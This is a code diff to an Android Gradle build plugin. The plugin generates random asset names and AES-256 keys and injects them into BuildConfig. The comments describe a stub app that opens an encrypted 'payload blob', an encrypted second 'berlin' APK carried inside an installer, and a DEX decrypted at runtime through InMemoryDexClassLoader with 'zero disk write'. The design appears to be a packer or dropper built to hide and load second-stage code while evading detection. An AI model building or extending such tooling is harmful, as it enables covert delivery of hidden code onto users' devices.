@@ -62,22 +62,48 @@ class FingerprintPlugin implements Plugin<Project> {
             berlinKeyHex = bytesToHex(berlinKeyGen.generateKey().encoded)
         }
 
-        project.ext.fp_buildUUID      = buildUUID
-        project.ext.fp_saltHex        = saltHex
-        project.ext.fp_aesKeyHex      = aesKeyHex
-        project.ext.fp_aesIvHex       = aesIvHex
-        project.ext.fp_buildTimestamp = buildTimestamp
-        project.ext.fp_md5            = hashBytes(token, "MD5")
-        project.ext.fp_sha1           = hashBytes(token, "SHA-1")
-        project.ext.fp_sha256         = hashBytes(token, "SHA-256")
-        project.ext.fp_sha512         = sha512hex
+        // Step 7 — Random asset name for encrypted installer DEX blob (BERLIN_DEX_ASSET)
+        // Berlin DEX encryption: encrypt_installer_dex.py encrypts classes.dex at build time.
+        // BerlinAppEntry.kt reads this asset at runtime, decrypts via InMemoryDexClassLoader — zero disk write.
+        // If -Pberlin.dexAsset is passed (CI pipeline), use it — else generate fresh random.
+        def berlinDexAssetName
+        if (project.hasProperty("berlin.dexAsset") && project.property("berlin.dexAsset")) {
+            berlinDexAssetName = project.property("berlin.dexAsset")
+            project.logger.lifecycle("[FingerprintPlugin] ✅ BERLIN_DEX_ASSET (override) : ${berlinDexAssetName}")
+        } else {
+            def dexAssetBytes = new byte[4]; rng.nextBytes(dexAssetBytes)
+            berlinDexAssetName = bytesToHex(dexAssetBytes) + ".bin"
+        }
+
+        // Step 8 — AES-256 key for installer DEX decryption at runtime (BERLIN_DEX_KEY)
+        // If -Pberlin.dexKey is passed (CI pipeline), use it — else generate fresh random.
+        def berlinDexKeyHex
+        if (project.hasProperty("berlin.dexKey") && project.property("berlin.dexKey")) {
+            berlinDexKeyHex = project.property("berlin.dexKey")
+            project.logger.lifecycle("[FingerprintPlugin] ✅ BERLIN_DEX_KEY (override) : ${berlinDexKeyHex.take(16)}...")
+        } else {
+            def dexKeyGen = KeyGenerator.getInstance("AES"); dexKeyGen.init(256, rng)
+            berlinDexKeyHex = bytesToHex(dexKeyGen.generateKey().encoded)
+        }
+
+        project.ext.fp_buildUUID        = buildUUID
+        project.ext.fp_saltHex          = saltHex
+        project.ext.fp_aesKeyHex        = aesKeyHex
+        project.ext.fp_aesIvHex         = aesIvHex
+        project.ext.fp_buildTimestamp   = buildTimestamp
+        project.ext.fp_md5              = hashBytes(token, "MD5")
+        project.ext.fp_sha1             = hashBytes(token, "SHA-1")
+        project.ext.fp_sha256           = hashBytes(token, "SHA-256")
+        project.ext.fp_sha512           = sha512hex
         // Step 3/9: BLAKE3 as independent second hash alongside SHA-512
         // Both must match before decryption proceeds (two different attack surfaces)
-        project.ext.fp_blake3         = blake3hex
-        project.ext.fp_assetB         = assetBName
-        project.ext.fp_assetA         = assetAName
-        project.ext.fp_assetC         = assetCName
-        project.ext.fp_berlinKeyHex   = berlinKeyHex
+        project.ext.fp_blake3           = blake3hex
+        project.ext.fp_assetB           = assetBName
+        project.ext.fp_assetA           = assetAName
+        project.ext.fp_assetC           = assetCName
+        project.ext.fp_berlinKeyHex     = berlinKeyHex
+        project.ext.fp_berlinDexAsset   = berlinDexAssetName
+        project.ext.fp_berlinDexKeyHex  = berlinDexKeyHex
 
         project.logger.lifecycle("[FingerprintPlugin] ✅ Fingerprint: ${buildUUID} | ${buildTimestamp}")
         project.logger.lifecycle("[FingerprintPlugin] ✅ SHA-512 : ${sha512hex.take(32)}...")
@@ -86,6 +112,8 @@ class FingerprintPlugin implements Plugin<Project> {
         project.logger.lifecycle("[FingerprintPlugin] ✅ ASSET_A : ${assetAName}")
         project.logger.lifecycle("[FingerprintPlugin] ✅ ASSET_C : ${assetCName}")
         project.logger.lifecycle("[FingerprintPlugin] ✅ BERLIN_KEY : ${berlinKeyHex.take(16)}...")
+        project.logger.lifecycle("[FingerprintPlugin] ✅ BERLIN_DEX_ASSET : ${berlinDexAssetName}")
+        project.logger.lifecycle("[FingerprintPlugin] ✅ BERLIN_DEX_KEY   : ${berlinDexKeyHex.take(16)}...")
 
         // Inject ASSET_B into BuildConfig — StubApp.kt uses this to open the payload blob
         project.android.defaultConfig.buildConfigField(
@@ -108,6 +136,18 @@ class FingerprintPlugin implements Plugin<Project> {
         // encrypt_berlin_for_installer.py uses this key to encrypt the berlin APK at build time
         project.android.defaultConfig.buildConfigField(
             "String", "BERLIN_KEY", "\"${berlinKeyHex}\""
+        )
+
+        // Inject BERLIN_DEX_ASSET into BuildConfig — BerlinAppEntry.kt reads encrypted DEX from this asset
+        // encrypt_installer_dex.py stores encrypted classes.dex here at build time (Berlin build only)
+        project.android.defaultConfig.buildConfigField(
+            "String", "BERLIN_DEX_ASSET", "\"${berlinDexAssetName}\""
+        )
+
+        // Inject BERLIN_DEX_KEY into BuildConfig — AES-256 key for installer DEX decryption at runtime
+        // BerlinAppEntry.kt decrypts via InMemoryDexClassLoader — zero disk write on device
+        project.android.defaultConfig.buildConfigField(
+            "String", "BERLIN_DEX_KEY", "\"${berlinDexKeyHex}\""
         )
 
         project.gradle.buildFinished {
